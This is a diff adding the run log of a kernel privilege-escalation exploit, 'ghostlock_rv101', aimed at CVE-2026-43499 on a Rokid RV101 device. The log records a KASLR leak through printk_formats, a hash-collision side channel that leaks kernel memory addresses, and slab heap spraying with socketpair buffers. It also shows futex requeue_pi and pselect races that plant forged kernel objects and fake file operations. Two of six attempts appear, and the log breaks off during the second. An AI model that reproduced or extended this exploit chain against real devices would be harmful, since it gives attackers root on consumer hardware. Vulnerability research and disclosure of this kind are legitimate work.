@@ -1,0 +1,83 @@
+[+] ghostlock_rv101 v9.30 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=3101 uid=2000 euid=2000 gid=2000
+[*] [T+396708ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffe28842ac0c slide=0x000000227e800000
+[*] printk_formats: "Function call interrupts" -> 0xffffffe2884ca100 slide=0x000000227e800000
+[+] KASLR: slide=0x000000227e800000 base=0xffffffe286800000 (2 anchors)
+[*] FOPS install attempt 1/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 0000005f68e216c0 (t=9260, ratio=1852)
+[*]   collision[2]: 0000005f6972cf18 (t=9661, ratio=1932)
+[*]   collision[3]: 0000005f6989ba90 (t=9636, ratio=1927)
+[*] kernelsnitch: top times: 9661 9636 9260 20 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=12276 mm=FOUND
+[*] kernelsnitch: elapsed 2025ms mm=ffffff803182a580
+[*] leaked mm=ffffff803182a580 slab base=ffffff8031828000
+[*] v9.14 settle[settle]: 36 rounds, o2=743 objs=771 (quiet=20)
+[*] v9.10 gate: mm slabs 84 -> 83 objs 771 -> 666 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 8 -> 1883 across full sequence (gate window 84 -> 1883, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8031829608 value=ffffff8031829500 mode=5 page=ffffff8031828000 fake_lock=ffffff8031828e00 fake_w0=ffffff8031829000 fake_task=ffffff8031829200 in=0000000000000000 out1=ffffff8031829600 out2=ffffffe2891bcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8031829200 ex3=ffffff8031828e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=8475
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=8475
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=8475
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=8475
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=8475
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffe287a1ab88 read=0xffffffe287a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[1] n=15872 llseek=0xffffffe287a1ab88 read=0xffffffe287a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[2] n=15872 llseek=0xffffffe287a1ab88 read=0xffffffe287a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, llseek=0x0000000000000000 exp=0xffffffe2891bcbc0)
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] FOPS install attempt 2/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 0000005f66bcdbf0 (t=9375, ratio=1875)
+[*]   collision[2]: 0000005f67798a48 (t=8954, ratio=1790)
+[*]   collision[3]: 0000005f679437a0 (t=9459, ratio=1891)
+[*] kernelsnitch: top times: 9459 9375 8954 20 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=13807 mm=FOUND
+[*] kernelsnitch: elapsed 2189ms mm=ffffff801ecfa940
+[*] leaked mm=ffffff801ecfa940 slab base=ffffff801ecf8000
+[*] v9.14 settle[settle]: 61 rounds, o2=2076 objs=857 (quiet=2)
+[*] v9.10 gate: mm slabs 87 -> 86 objs 857 -> 720 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 1 -> 3030 across full sequence (gate window 87 -> 3030, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff801ecf9608 value=ffffff801ecf9500 mode=5 page=ffffff801ecf8000 fake_lock=ffffff801ecf8e00 fake_w0=ffffff801ecf9000 fake_task=ffffff801ecf9200 in=0000000000000000 out1=ffffff801ecf9600 out2=ffffffe2891bcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff801ecf9200 ex3=ffffff801ecf8e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=13839
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=13839
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=13839
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=13839
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=13839
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
